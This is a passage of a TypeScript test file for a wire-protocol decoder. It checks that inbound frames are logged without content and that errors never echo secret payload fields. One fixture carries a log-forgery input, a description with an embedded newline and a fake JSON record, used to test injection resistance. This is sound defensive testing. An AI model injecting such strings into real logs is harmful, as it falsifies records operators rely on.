      result_detail: SECRET_DETAIL
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('tool_result')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [SECRET_CONV, SECRET_TURN, SECRET_TU, SECRET_SUMMARY, SECRET_DETAIL]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed tool_result throw path (#229)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeToolResult({ ...TOOL_RESULT, is_error: 'nope' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('does NOT log when the ONLY defect is a malformed result_detail (#773)', () => {
    const { log, lines } = captureLog()
    // Every other field is well-formed: the new throw path must leave no record either.
    expect(() =>
      parseInboundMessage(encodeToolResult({ ...TOOL_RESULT, result_detail: 42 }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a queue_state content-free, never a text / queued_msg_id / conversation_id (#292)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const SECRET_TEXT = 'secret-queued-message-text'
    const SECRET_MSG_ID = 987654
    const plaintext = encodeQueueState({
      conversation_id: SECRET_CONV,
      queued: [{ queued_msg_id: SECRET_MSG_ID, text: SECRET_TEXT, ts: '2026-07-10T00:00:00Z' }]
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('queue_state')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log (deliberately no count).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [SECRET_CONV, SECRET_TEXT, String(SECRET_MSG_ID)]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed queue_state throw path (#292)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeQueueState({ conversation_id: 'conv-1', queued: [{ queued_msg_id: '7', text: 'x', ts: 't' }] }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a modal_shown content-free, never a title / prompt / option label / modal_id / conversation_id (#201, #870)', () => {
    const { log, lines } = captureLog()
    const SECRET_MODAL = 'secret-modal-id'
    const SECRET_TITLE = 'secret-modal-title'
    const SECRET_PROMPT = 'secret-modal-prompt'
    const SECRET_LABEL = 'secret-option-label'
    const SECRET_CONVERSATION = 'secret-conversation-id'
    const plaintext = encodeModalShown({
      ...MODAL_SHOWN,
      conversation_id: SECRET_CONVERSATION,
      modal_id: SECRET_MODAL,
      title: SECRET_TITLE,
      prompt: SECRET_PROMPT,
      options: [{ id: 'allow', label: SECRET_LABEL }]
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('modal_shown')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [SECRET_MODAL, SECRET_TITLE, SECRET_PROMPT, SECRET_LABEL, SECRET_CONVERSATION]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('logs a modal_dismissed content-free, never the modal_id / outcome / source (#201)', () => {
    const { log, lines } = captureLog()
    const SECRET_MODAL = 'secret-modal-id'
    const SECRET_OUTCOME = 'secret-outcome-value'
    const plaintext = encodeModalDismissed({
      modal_id: SECRET_MODAL,
      outcome: SECRET_OUTCOME,
      source: 'remote'
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('modal_dismissed')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [SECRET_MODAL, SECRET_OUTCOME]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed modal_shown throw path (#201)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeModalShown({ ...MODAL_SHOWN, class: 'destructive' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a question_shown content-free, never a question / header / label / description / id (#884)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONVERSATION = 'secret-conversation-id'
    const SECRET_BATCH = 'secret-question-batch-nonce'
    const SECRET_QUESTION = 'secret-question-text'
    const SECRET_HEADER = 'secret-header'
    const SECRET_LABEL = 'secret-option-label'
    const SECRET_DESCRIPTION = 'secret-option-description'
    const plaintext = encodeQuestionShown({
      conversation_id: SECRET_CONVERSATION,
      question_batch_id: SECRET_BATCH,
      questions: [
        {
          question: SECRET_QUESTION,
          header: SECRET_HEADER,
          options: [{ label: SECRET_LABEL, description: SECRET_DESCRIPTION }],
          multi_select: false
        }
      ]
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('question_shown')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log. Deliberately NO count of
    // questions: the set stays type/bytes/hash, matching the modal_shown arm rather than message_chunk.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    // The four strings are untrusted claude-authored text; conversation_id is a routing key and
    // question_batch_id an UNGUESSABLE nonce, which must never reach a log at all.
    for (const secret of [
      SECRET_CONVERSATION,
      SECRET_BATCH,
      SECRET_QUESTION,
      SECRET_HEADER,
      SECRET_LABEL,
      SECRET_DESCRIPTION
    ]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('logs a question_dismissed content-free, never the nonce / outcome / source (#894)', () => {
    const { log, lines } = captureLog()
    const SECRET_BATCH = 'secret-question-batch-nonce'
    const SECRET_OUTCOME = 'secret-outcome-sentinel'
    const SECRET_SOURCE = 'secret-source-cause'
    const plaintext = encodeQuestionDismissed({
      question_batch_id: SECRET_BATCH,
      outcome: SECRET_OUTCOME,
      source: SECRET_SOURCE
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    // `inbound-decoded`, not `inbound-unmodeled`: the log record's event/code is what actually
    // distinguishes a decoded frame from one the default arm swallowed (AC4).
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('question_dismissed')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    // `question_batch_id` is the batch's own UNGUESSABLE nonce, echoed back; it must never reach a log
    // at all. `outcome` and `source` are producer sentinels — not secret, but no business in a record
    // the operator can ship off-box in a debug bundle.
    for (const secret of [SECRET_BATCH, SECRET_OUTCOME, SECRET_SOURCE]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed question_dismissed throw path (#894)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeQuestionDismissed({ ...QUESTION_DISMISSED, source: 42 }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a slash_command_list content-free, never a name / hint / description / alias / id (#936)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONVERSATION = 'secret-conversation-id'
    const SECRET_NAME = 'secret-command-name'
    const SECRET_HINT = 'secret-argument-hint'
    // A newline-bearing description: `0x0a` is the only sub-0x20 byte measured on this frame's strings,
    // and these are WORKSPACE-AUTHORED — so a description reaching this JSON-lines log would hand its
    // author a log-forgery primitive in a file the operator can ship off-box in a debug bundle.
    const SECRET_DESCRIPTION = 'secret-description\n{"event":"forged"}'
    const SECRET_ALIAS = 'secret-alias'
    const SECRET_CUT = 'secret-cut-field'
    const plaintext = encodeSlashCommandList({
      conversation_id: SECRET_CONVERSATION,
      commands: [
        {
          name: SECRET_NAME,
          argument_hint: SECRET_HINT,
          description: SECRET_DESCRIPTION,
          aliases: [SECRET_ALIAS],
          truncated_fields: [SECRET_CUT]
        }
      ],
      dropped_commands: 4
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('slash_command_list')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set. Deliberately NO `count` of commands even though DiagnosticEvent
    // carries the field: how many verbs a workspace offers is itself a fact about the repository the user
    // has open (the background_task_roster / modal_shown posture, not message_chunk's).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [
      SECRET_CONVERSATION,
      SECRET_NAME,
      SECRET_HINT,
      SECRET_DESCRIPTION,
      SECRET_ALIAS,
      SECRET_CUT
    ]) {
      expect(lines[0]).not.toContain(secret)
    }
    // The forged-record fragment specifically: one line in, one line out.
    expect(lines[0]).not.toContain('forged')
  })

  it('does NOT log on a malformed slash_command_list throw path (#936)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeSlashCommandList({
          ...SLASH_COMMAND_LIST,
          commands: [{ ...ONE_COMMAND, aliases: null }]
        }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('does NOT log on a malformed question_shown throw path (#884)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeQuestionShown({ ...QUESTION_SHOWN, questions: {} }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('does NOT log on a malformed modal_dismissed throw path (#201)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeModalDismissed({ ...MODAL_DISMISSED, source: 'admin' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a conversations reply content-free, never a name / cwd / id, and no count (#139)', () => {
    const { log, lines } = captureLog()
    const SECRET_NAME = 'secret-conversation-title'
    const SECRET_CWD = '/home/secret/workspace'
    const plaintext = encodeConversations({
      conversations: [
        { ...CONV_NAMED, name: SECRET_NAME, cwd: SECRET_CWD },
        CONV_UNNAMED
      ]
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('conversations')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no row field, and NO `count` (unlike message_chunk): a
    // conversation-count is more identifying than a message-batch size (AC7 restricts to type/bytes/hash).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_NAME)
    expect(lines[0]).not.toContain(SECRET_CWD)
    expect(lines[0]).not.toContain('conv-1')
  })

  it('does NOT log on a malformed conversations throw path (#139)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeConversations({ conversations: [{ ...CONV_NAMED, name: 42 }] }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a recent_workspaces_list reply content-free, never a path, and no count (#380)', () => {
    const { log, lines } = captureLog()
    const SECRET_PATH = '/home/secret/workspace'
    const plaintext = encodeRecentWorkspaces({
      workspaces: [{ ...WS_ONE, path: SECRET_PATH }, WS_TWO]
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('recent_workspaces_list')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no row field, and NO `count` (the conversations #139 posture):
    // a workspace-count is more identifying than a message-batch size (AC restricts to type/bytes/hash).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_PATH)
  })

  it('does NOT log on a malformed recent_workspaces_list throw path (#380)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeRecentWorkspaces({ workspaces: [{ ...WS_ONE, path: 42 }] }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a conversation_created reply content-free, never a name / cwd / id, and no count (#241)', () => {
    const { log, lines } = captureLog()
    const SECRET_NAME = 'secret-conversation-title'
    const SECRET_CWD = '/home/secret/workspace'
    const plaintext = encodeConversationCreated({
      ...CREATED_NAMED,
      id: 'secret-conv-id',
      name: SECRET_NAME,
      cwd: SECRET_CWD
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('conversation_created')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no row field, and NO `count` (the conversations #139 posture).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_NAME)
    expect(lines[0]).not.toContain(SECRET_CWD)
    expect(lines[0]).not.toContain('secret-conv-id')
  })

  it('does NOT log on a malformed conversation_created throw path (#241)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeConversationCreated({ ...CREATED_NAMED, is_promoted: 'nope' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a conversation_updated reply content-free, never a name / cwd / id, and no count (#273)', () => {
    const { log, lines } = captureLog()
    const SECRET_NAME = 'secret-channel-title'
    const SECRET_CWD = '/home/secret/workspace'
    const plaintext = encodeConversationUpdated({
      ...UPDATED_NAMED,
      id: 'secret-conv-id',
      name: SECRET_NAME,
      cwd: SECRET_CWD
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('conversation_updated')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no row field, and NO `count` (the conversation_created posture).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_NAME)
    expect(lines[0]).not.toContain(SECRET_CWD)
    expect(lines[0]).not.toContain('secret-conv-id')
  })

  it('does NOT log on a malformed conversation_updated throw path (#273)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeConversationUpdated({ ...UPDATED_NAMED, is_promoted: 'nope' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a conversation_deleted reply content-free, never the id, and no count (#375)', () => {
    const { log, lines } = captureLog()
    const SECRET_ID = 'secret-deleted-conv-id'
    const plaintext = encodeConversationDeleted({ id: SECRET_ID })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('conversation_deleted')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no `id`, and NO `count` (the conversation_updated posture).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_ID)
  })

  it('does NOT log on a malformed conversation_deleted throw path (#375)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeConversationDeleted({ id: 42 }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('logs a workspace_folder_created reply content-free, never the path, and no count (#381)', () => {
    const { log, lines } = captureLog()
    const SECRET_PATH = '/home/secret-user/projects/secret-app'
    const plaintext = encodeWorkspaceFolderCreated({ path: SECRET_PATH })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('workspace_folder_created')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no `path`, and NO `count` (the conversation_deleted posture).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_PATH)
  })

  it('does NOT log on a malformed workspace_folder_created throw path (#381)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeWorkspaceFolderCreated({ path: 42 }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('logs a session_transition content-free, never a decoded field (#254)', () => {
    const { log, lines } = captureLog()
    const SECRET_PREV = 'secret-previous-session-id'
    const SECRET_NEW = 'secret-new-session-id'
    const SECRET_CWD = '/home/secret/workspace'
    const plaintext = encodeSessionTransition({
      previous_session_id: SECRET_PREV,
      new_session_id: SECRET_NEW,
      reason: 'workspace_change',
      occurred_at: '2026-07-10T00:00:00.000000000Z',
      workspace_cwd: SECRET_CWD
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('session_transition')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field (session ids / reason / occurred_at /
    // workspace_cwd) reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [SECRET_PREV, SECRET_NEW, SECRET_CWD, 'workspace_change']) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed session_transition throw path (#254)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeSessionTransition({ ...SESSION_TRANSITION, reason: 'evicted' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a session_settings_updated content-free, never the session_id (#264)', () => {
    const { log, lines } = captureLog()
    const SECRET_ID = 'secret-session-id-value'
    const plaintext = encodeSessionSettingsUpdated({ session_id: SECRET_ID })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('session_settings_updated')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — the decoded session_id never reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_ID)
  })

  it('does NOT log on a malformed session_settings_updated throw path (#264)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeSessionSettingsUpdated({}), log)).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a modeled error as inbound-decoded(error), never the ErrorPayload text (#116)', () => {
    const { log, lines } = captureLog()
    const SECRET_ERR = 'secret-daemon-error-detail'
    const plaintext = encodeEnvelope({
      id: 1,
      type: 'error',
      ts: FIXED_TS,
      payload: { code: 'server.binary_offline', message: SECRET_ERR, retryable: true }
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    // Now modeled: it moves from inbound-unmodeled to inbound-decoded(error).
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('error')
    expect(record.hash).toMatch(HEX64)
    expect(lines[0]).not.toContain(SECRET_ERR)
  })

  it('logs an unmodeled envelope by type instead of silently dropping it (AC2)', () => {
    const { log, lines } = captureLog()
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })

    const result = parseInboundMessage(bytes, log)

    // The "not modeled here" behavior is unchanged: still returns null.
    expect(result).toBeNull()
    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-unmodeled')
    expect(record.code).toBe('ack')
    expect(record.bytes).toBe(bytes.length)
    expect(record.hash).toMatch(HEX64)
  })

  it('caps a hostile long unmodeled type at 64 chars, one record, still null (security)', () => {
    const { log, lines } = captureLog()
    const bytes = encodeEnvelope({ id: 1, type: 'x'.repeat(200), ts: FIXED_TS, payload: {} })

    const result = parseInboundMessage(bytes, log)

    expect(result).toBeNull()
    expect(lines).toHaveLength(1) // JSON-escape holds: no split across lines.
    const record = JSON.parse(lines[0])
    expect(record.code).toBe('x'.repeat(64))
    expect(record.code.length).toBe(64)
  })

  it('hashes identical plaintext identically and different plaintext differently (recurrence signal)', () => {
    const { log, lines } = captureLog()
    const same = encodeMessage(MSG)
    const other = encodeMessage({ ...MSG, text: 'a different body' })

    parseInboundMessage(same, log)
    parseInboundMessage(same, log)
    parseInboundMessage(other, log)

    const [r0, r1, r2] = lines.map((line) => JSON.parse(line))
    expect(r0.hash).toBe(r1.hash)
    expect(r0.hash).not.toBe(r2.hash)
  })

  it('does NOT log on the throw path — a modeled message that fails to narrow', () => {
    const { log, lines } = captureLog()

    expect(() => parseInboundMessage(encodeMessage({ ...MSG, text: undefined }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('does NOT log on an oversized plaintext throw', () => {
    const { log, lines } = captureLog()
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 1,
        type: 'message',
        ts: FIXED_TS,
        payload: { ...MSG, text: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )

    expect(() => parseInboundMessage(bytes, log)).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('does not log and does not throw when no logger is injected (AC5)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
    expect(parseInboundMessage(encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} }))).toBeNull()
    expect(() => parseInboundMessage(encodeMessage({ ...MSG, text: undefined }))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — secret-safety / log-free', () => {
  it('never logs and never echoes a payload value in a thrown error message', () => {
    const methods = ['log', 'info', 'warn', 'error', 'debug', 'trace'] as const
    const spies = methods.map((m) => vi.spyOn(console, m).mockImplementation(() => {}))
    const SECRET_TEXT = 'super-secret-conversation-text'
    const SECRET_CONV = 'secret-conversation-id'
    try {
      // Happy path.
      parseInboundMessage(
        encodeMessage({ conversation_id: SECRET_CONV, message_id: 'm1', role: 'user', text: SECRET_TEXT })
      )
      // Failing path: an unknown role, with the secret text/conv present as valid strings — this is
      // where a naive impl would interpolate the offending role value into the error message.
      let thrown: unknown = null
      try {
        parseInboundMessage(
          encodeMessage({
            conversation_id: SECRET_CONV,
            message_id: 'm1',
            role: 'system',
            text: SECRET_TEXT
          })
        )
      } catch (e) {
        thrown = e
      }
      expect(thrown).toBeInstanceOf(WireDecodeError)
      const message = (thrown as Error).message
      expect(message).not.toContain('system')
      expect(message).not.toContain(SECRET_TEXT)
      expect(message).not.toContain(SECRET_CONV)
      for (const spy of spies) expect(spy).not.toHaveBeenCalled()
    } finally {
      for (const spy of spies) spy.mockRestore()
    }
  })

  it('names the failure category only for a bad modal class / source — never echoes the value (#201, AC3)', () => {
    // A modal_shown whose class is out-of-enum, with the secret title/prompt present as valid strings.
    let shownErr: unknown = null
    try {
      parseInboundMessage(
        encodeModalShown({
          ...MODAL_SHOWN,
          class: 'destructive',
          title: 'secret-title',
          prompt: 'secret-prompt'
        })
      )
    } catch (e) {
      shownErr = e
    }
    expect(shownErr).toBeInstanceOf(WireDecodeError)
    const shownMsg = (shownErr as Error).message
    for (const leak of ['destructive', 'secret-title', 'secret-prompt']) {
      expect(shownMsg).not.toContain(leak)
    }

    // A modal_dismissed whose source is out-of-enum, with the secret outcome present.
    let dismissedErr: unknown = null
    try {
      parseInboundMessage(
        encodeModalDismissed({ modal_id: 'mdl', outcome: 'secret-outcome', source: 'admin' })
      )
    } catch (e) {
      dismissedErr = e
    }
    expect(dismissedErr).toBeInstanceOf(WireDecodeError)
    const dismissedMsg = (dismissedErr as Error).message
    for (const leak of ['admin', 'secret-outcome']) {
      expect(dismissedMsg).not.toContain(leak)
    }
  })

  it('never echoes a question_dismissed field into the thrown message (#894, AC3)', () => {
    // The message reaches a caller's catch — daemonConnection catches WireDecodeError — so a value
    // interpolated here could ride into a log this decoder is otherwise careful never to write. Each
    // case breaks ONE field while both siblings are valid strings carrying distinctive sentinels.
    const cases: Array<{ payload: unknown; leaks: string[] }> = [
      {
        payload: { question_batch_id: 'secret-batch-nonce', outcome: 'secret-outcome' }, // source absent
        leaks: ['secret-batch-nonce', 'secret-outcome']
      },
      {
        payload: {
          question_batch_id: 'secret-batch-nonce',
          outcome: 42, // the bad field
          source: 'secret-source'
        },
        leaks: ['secret-batch-nonce', 'secret-source']
      },
      {
        // Broken at the record level, so the whole payload is the offending value.
        payload: ['secret-batch-nonce', 'secret-outcome', 'secret-source'],
        leaks: ['secret-batch-nonce', 'secret-outcome', 'secret-source']
      }
    ]

    for (const { payload, leaks } of cases) {
      let err: unknown = null
      try {
        parseInboundMessage(encodeQuestionDismissed(payload))
      } catch (e) {
        err = e
      }
      expect(err).toBeInstanceOf(WireDecodeError)
      const message = (err as Error).message
      for (const leak of leaks) {
        expect(message).not.toContain(leak)
      }
    }
  })

  it('never echoes a slash_command_list field into the thrown message (#936, AC5)', () => {
    // The message reaches a caller's catch — daemonConnection catches WireDecodeError — so a value
    // interpolated here could ride into the log this decoder is otherwise careful never to write, which
    // is the same log-forgery exposure the content-free log test pins from the other side. Each case
    // breaks ONE field while every sibling carries a distinctive sentinel.
    const sentinels = {
      conversation_id: 'secret-conversation',
      name: 'secret-name',
      argument_hint: 'secret-hint',
      description: 'secret-description',
      alias: 'secret-alias',
      cut: 'secret-cut-field'
    }
    const row = {
      name: sentinels.name,
      argument_hint: sentinels.argument_hint,
      description: sentinels.description,
      aliases: [sentinels.alias],
      truncated_fields: [sentinels.cut]
    }
    const leaks = Object.values(sentinels)
    const cases: unknown[] = [
      // Broken at the row level, the deepest one, one field at a time, all sentinels present and valid.
      {
        conversation_id: sentinels.conversation_id,
        commands: [{ ...row, aliases: null }],
        dropped_commands: 0
      },
      {
        conversation_id: sentinels.conversation_id,
        commands: [{ ...row, truncated_fields: 7 }],
        dropped_commands: 0
      },
      {
        conversation_id: sentinels.conversation_id,
        commands: [{ ...row, name: 42 }],
        dropped_commands: 0
      },
      // Broken at the frame level, with every row still valid.
      { conversation_id: sentinels.conversation_id, commands: [row], dropped_commands: '0' }
    ]

    for (const payload of cases) {
      let err: unknown = null
      try {
        parseInboundMessage(encodeSlashCommandList(payload))
      } catch (e) {
        err = e
      }
      expect(err).toBeInstanceOf(WireDecodeError)
      const message = (err as Error).message
      for (const leak of leaks) {
        expect(message).not.toContain(leak)
      }
    }
  })

  it('never echoes a question_shown field into the thrown message (#884, AC4)', () => {
    // The message reaches a caller's catch — daemonConnection catches WireDecodeError — so a value
    // interpolated here could ride into a log the decoder itself is careful never to write. Each case
    // breaks ONE field while every sibling is a valid string carrying a distinctive sentinel.
    const cases: Array<{ payload: unknown; leaks: string[] }> = [
      {
        // Broken at the option level, the deepest one, with all six sentinels present and valid.
        payload: {
          conversation_id: 'secret-conversation',
          question_batch_id: 'secret-batch-nonce',
          questions: [
            {
              question: 'secret-question',
              header: 'secret-header',
              options: [{ label: 'secret-label' }], // description missing
              multi_select: false
            }
          ]
        },
        leaks: [
          'secret-conversation',
          'secret-batch-nonce',
          'secret-question',
          'secret-header',
          'secret-label'
        ]
      },
      {
        // Broken at multi_select, with the string "false" — the truthiness trap — as the bad value.
        payload: {
          ...QUESTION_SHOWN,
          conversation_id: 'secret-conversation',
          question_batch_id: 'secret-batch-nonce',
          questions: [{ ...ONE_QUESTION, question: 'secret-question', multi_select: 'false' }]
        },
        leaks: ['secret-conversation', 'secret-batch-nonce', 'secret-question', 'Write strategy']
      }
    ]

    for (const { payload, leaks } of cases) {
      let err: unknown = null
      try {
        parseInboundMessage(encodeQuestionShown(payload))
      } catch (e) {
        err = e
      }
      expect(err).toBeInstanceOf(WireDecodeError)
      const message = (err as Error).message
      for (const leak of leaks) {
        expect(message).not.toContain(leak)
      }
    }
  })
})

describe('parseInboundMessage — session_settings recognition (#491)', () => {
  it('narrows a full session_settings into { kind: session-settings } with all six fields', () => {
    expect(parseInboundMessage(encodeSessionSettings(RUN_CONFIG))).toEqual({
      kind: 'session-settings',
      sessionSettings: RUN_CONFIG,
      inReplyTo: 812
    })
  })

  it('decodes an empty session_id as the value "", never as absent', () => {
    // '' is the daemon saying "I have no session to address". The run-config sheet's gate must be
    // able to see it: defaulting or dropping it would make it indistinguishable from "no reply
    // yet", which is exactly the ambiguity that let the inert-sheet defect hide (#491).
    const noSession = { ...RUN_CONFIG, session_id: '' }
    expect(parseInboundMessage(encodeSessionSettings(noSession))).toEqual({
      kind: 'session-settings',
      sessionSettings: noSession,
      inReplyTo: 812
    })
